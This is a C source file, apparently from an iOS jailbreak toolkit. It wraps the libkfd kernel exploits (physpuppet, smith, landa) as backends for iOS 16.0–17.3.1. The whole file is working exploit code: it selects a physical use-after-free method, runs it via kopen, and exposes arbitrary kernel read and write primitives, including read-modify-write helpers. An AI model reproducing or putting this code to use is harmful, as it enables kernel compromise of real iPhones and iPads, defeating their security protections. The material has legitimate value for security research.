//
//  ke_backend_kfd.m — krw backend over libkfd (opa334/Dopamine fork of
//  Félix Poulin-Bélanger's kfd, MIT), vendored under vendor/libkfd.
//
//  iOS 16.0 – 17.3.1 (arm64 + arm64e): the landa puaf plus the
//  kread_sem_open/kwrite_sem_open pair requires no kernelcache symbols.
//  The struct proc layout is derived at runtime inside the sem_open
//  find_proc (Serotonin-style), so no offsets table is needed.
//
//  iOS 15.x: kfd exploits do not apply; the ClearSword backend with a
//  per-build offsets table is the fallback.
//
#include "ke_internal.h"

#include "libkfd.h"
#undef T1SZ_BOOT

u64 gKeKfdKernelProc = 0;
u64 gKeKfdCurrentProc = 0;
u64 gKeRuntimeProcPid = 0;
u64 gKeRuntimeProcTask = 0;
u64 gKeRuntimeProcObjectSize = 0;

static u64 g_kfd = 0;

static void keKfdFillDynamicInfoMinimal(void)
{
    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = false,
        .krkw_iosurface_supported = false,
        .perf_supported = false,
    };
}

static void keKfdSyncRuntimeGlobals(void)
{
    struct kfd *kfd = (struct kfd *)g_kfd;
    gKeKfdCurrentProc = kfd->info.kaddr.current_proc;
    gKeRuntimeProcPid = dynamic_system_info.proc__p_pid;
    gKeRuntimeProcTask = dynamic_system_info.proc__task;
    gKeRuntimeProcObjectSize = dynamic_system_info.proc__object_size;
}

static uint32_t keKfdAutoPuafPages(void)
{
    // Simplified from Dopamine's kfd driver: 512 default, 3072 on >= 6GB devices
    uint64_t memsize = 0;
    size_t size = sizeof(memsize);
    if (sysctlbyname("hw.memsize", &memsize, &size, NULL, 0) == 0 && memsize >= (5ULL << 30)) {
        return 3072;
    }
    return 512;
}

int keKfdInit(KEBackendID backend, const KEConfig *config)
{
    if (keEnv.major < 16) {
        return KE_ERR_UNSUPPORTED_VERSION;
    }

    u64 puafMethod;
    switch (backend) {
        case KE_BACKEND_KFD_PHYSPUPPET: puafMethod = puaf_physpuppet; break;
        case KE_BACKEND_KFD_SMITH:      puafMethod = puaf_smith;      break;
        case KE_BACKEND_KFD_LANDA:      puafMethod = puaf_landa;      break;
        default: return KE_ERR_INVALID_ARGUMENT;
    }

    keKfdFillDynamicInfoMinimal();
    gKeKfdKernelProc = 0;
    gKeKfdCurrentProc = 0;

    // landa + sem_open pair: no kernelcache symbols required at any step
    u64 kreadMethod = kread_sem_open;
    u64 kwriteMethod = kwrite_sem_open;

    uint32_t puafPages = config->puafPages ? config->puafPages : keKfdAutoPuafPages();

    g_kfd = kopen(puafPages, puafMethod, kreadMethod, kwriteMethod);
    if (!g_kfd) {
        return KE_ERR_EXPLOIT_FAILED;
    }
    keKfdSyncRuntimeGlobals();
    if (!gKeKfdCurrentProc || !gKeRuntimeProcObjectSize) {
        kclose(g_kfd);
        g_kfd = 0;
        return KE_ERR_OFFSETS_MISSING;
    }
    return KE_OK;
}

static int keKfdInitWrapper(const KEConfig *config) { return keKfdInit(KE_BACKEND_KFD_PHYSPUPPET, config); }
static int keKfdInitLanda(const KEConfig *config)   { return keKfdInit(KE_BACKEND_KFD_LANDA, config); }
static int keKfdInitSmith(const KEConfig *config)   { return keKfdInit(KE_BACKEND_KFD_SMITH, config); }

static void keKfdDeinit(void)
{
    if (g_kfd) {
        kclose(g_kfd);
        g_kfd = 0;
    }
    gKeKfdKernelProc = 0;
    gKeKfdCurrentProc = 0;
}

static uint8_t rd8(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint8_t)out; }
static uint16_t rd16(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint16_t)out; }
static uint32_t rd32(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint32_t)out; }

static void wr8(uint64_t where, uint8_t what) {
    u64 buf[1] = { 0 };
    ((uint8_t*)buf)[0] = what;
    ((uint8_t*)buf)[1] = rd8(where + 1);
    ((uint8_t*)buf)[2] = rd8(where + 2);
    ((uint8_t*)buf)[3] = rd8(where + 3);
    ((uint8_t*)buf)[4] = rd8(where + 4);
    ((uint8_t*)buf)[5] = rd8(where + 5);
    ((uint8_t*)buf)[6] = rd8(where + 6);
    ((uint8_t*)buf)[7] = rd8(where + 7);
    kwrite(g_kfd, buf, where, sizeof(u64));
}
static void wr16(uint64_t where, uint16_t what) {
    u64 buf[1] = { 0 };
    ((uint16_t*)buf)[0] = what;
    ((uint16_t*)buf)[1] = rd16(where + 2);
    ((uint16_t*)buf)[2] = rd16(where + 4);
    ((uint16_t*)buf)[3] = rd16(where + 6);
    kwrite(g_kfd, buf, where, sizeof(u64));
}
static void wr32(uint64_t where, uint32_t what) {
    u64 buf[1] = { 0 };
    ((uint32_t*)buf)[0] = what;
    ((uint32_t*)buf)[1] = rd32(where + 4);
    kwrite(g_kfd, buf, where, sizeof(u64));
}

static int keKfdReadBuf(uint64_t kaddr, void *out, size_t size)
{
    if (size == 1) { *(uint8_t*)out = rd8(kaddr); return 0; }
    if (size == 2) { *(uint16_t*)out = rd16(kaddr); return 0; }
    if (size == 4) { *(uint32_t*)out = rd32(kaddr); return 0; }
    if (size >= UINT16_MAX) {
        for (size_t start = 0; start < size; start += UINT16_MAX) {
            size_t chunk = UINT16_MAX;
            if (start + chunk > size) chunk = size - start;
            kread(g_kfd, kaddr + start, ((uint8_t*)out) + start, chunk);
        }
    } else {
        kread(g_kfd, kaddr, out, size);
    }
    return 0;
}

static int keKfdWriteBuf(uint64_t kaddr, const void *in, size_t size)
{
    if (size == 1) { wr8(kaddr, *(const uint8_t*)in); return 0; }
    if (size == 2) { wr16(kaddr, *(const uint16_t*)in); return 0; }
    if (size == 4) { wr32(kaddr, *(const uint32_t*)in); return 0; }
    if (size >= UINT16_MAX) {
        for (size_t start = 0; start < size; start += UINT16_MAX) {
            size_t chunk = UINT16_MAX;
            if (start + chunk > size) chunk = size - start;
            kwrite(g_kfd, (void*)((const uint8_t*)in) + start, kaddr + start, chunk);
        }
    } else {
        kwrite(g_kfd, (void*)in, kaddr, size);
    }
    return 0;
}

const KEBackendOps keBackendKfdPhyspuppet = {
    .name = "kfd/physpuppet", .id = KE_BACKEND_KFD_PHYSPUPPET,
    .init = keKfdInitWrapper, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};

const KEBackendOps keBackendKfdLanda = {
    .name = "kfd/landa", .id = KE_BACKEND_KFD_LANDA,
    .init = keKfdInitLanda, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};

const KEBackendOps keBackendKfdSmith = {
    .name = "kfd/smith", .id = KE_BACKEND_KFD_SMITH,
    .init = keKfdInitSmith, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};
